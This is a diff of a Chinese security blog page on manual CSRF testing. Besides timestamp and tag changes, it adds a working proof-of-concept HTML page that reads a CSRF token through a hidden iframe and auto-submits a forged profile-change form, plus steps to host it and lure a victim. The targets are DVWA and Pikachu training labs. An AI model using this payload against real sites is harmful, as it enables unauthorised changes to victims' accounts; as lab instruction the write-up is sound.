@@ -29,7 +29,7 @@
 <meta property="og:image" content="/2020/02/19/CSRF漏洞手工测试/11.png">
 <meta property="og:image" content="/2020/02/19/CSRF漏洞手工测试/12.png">
 <meta property="og:image" content="/2020/02/19/CSRF漏洞手工测试/13.png">
-<meta property="og:updated_time" content="2020-02-19T09:55:56.602Z">
+<meta property="og:updated_time" content="2020-02-20T06:31:02.542Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CSRF漏洞手工测试">
 <meta name="twitter:description" content="0X00 背景知识 一般流程 ​    黑客创建一个恶意的链接，当受害者点击时，链接就会通过受害者已建立的身份认证的网站进行各种恶意操作。黑客是不知道是否成功的，只能等待一段时间后，到对应的网站上去尝试恶意链接中的伪造  CSRF攻击条件  目标网站没有对修改个人信息的操作进行CSRF防御处理 因此, 判断一个网站有没有CSRF漏洞, 其实就是判断对关键信息(密码等)的操作(增删改)是否容易被伪造">
@@ -174,7 +174,7 @@
 
         
         <a href="/2020/02/19/CSRF漏洞手工测试/" class="archive-article-date">
-  	<time datetime="2020-02-19T10:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-19</time>
+  	<time datetime="2020-02-19T10:10:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-19</time>
 </a>
         
       </header>
@@ -305,6 +305,28 @@
 </li>
 </ul>
 <ul>
+<li><p><code>&lt;iframe&gt;</code>获取token</p>
+<p>类似于第一种方法,先用<code>iframe</code>加载一次页面, 读取页面的token, 然后在模拟请求</p>
+<ul>
+<li><p>模拟网站</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 10001</span><br></pre></td></tr></table></figure>
+
+<p>在根目录下创建, test.html, 内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    function attack()</span><br><span class="line">    &#123;</span><br><span class="line">   document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value;//获取usertoken并且赋值</span><br><span class="line">  </span><br><span class="line">  document.getElementById(&quot;transfer&quot;).submit(); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;iframe src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://192.168.0.109/pikachu/vul/csrf/csrftoken/token_get_edit.php&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;a&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;a&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;q&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;1231234@qq.com&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">  &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>诱使目标访问模拟的网站</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.101:10001/test.html</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<pre><code>点下按钮后,即成功</code></pre><ul>
 <li><p>burpsuite暴力破解</p>
 <ul>
 <li><p>burpsuite抓包,发送到<code>Intruder</code></p>
@@ -448,6 +470,15 @@
   
 <nav id="article-nav">
   
+    <a href="/2020/02/20/DoraBox靶场之CSRF训练/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          DoraBox靶场之CSRF训练
+        
+      </div>
+    </a>
+  
   
     <a href="/2020/02/18/XSS漏洞手工测试/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">XSS漏洞手工测试</div>
@@ -586,15 +617,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Docker容器</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">CTF靶机系列</a>
+                <a href="javascript:void(0)" class="js-tag color5">DoraBox靶场</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+                <a href="javascript:void(0)" class="js-tag color3">CTF靶机系列</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -606,11 +641,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透知识</a>
+                <a href="javascript:void(0)" class="js-tag color1">Web网站</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web网站</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透知识</a>
               </li>
              
               <li class="article-tag-list-item">
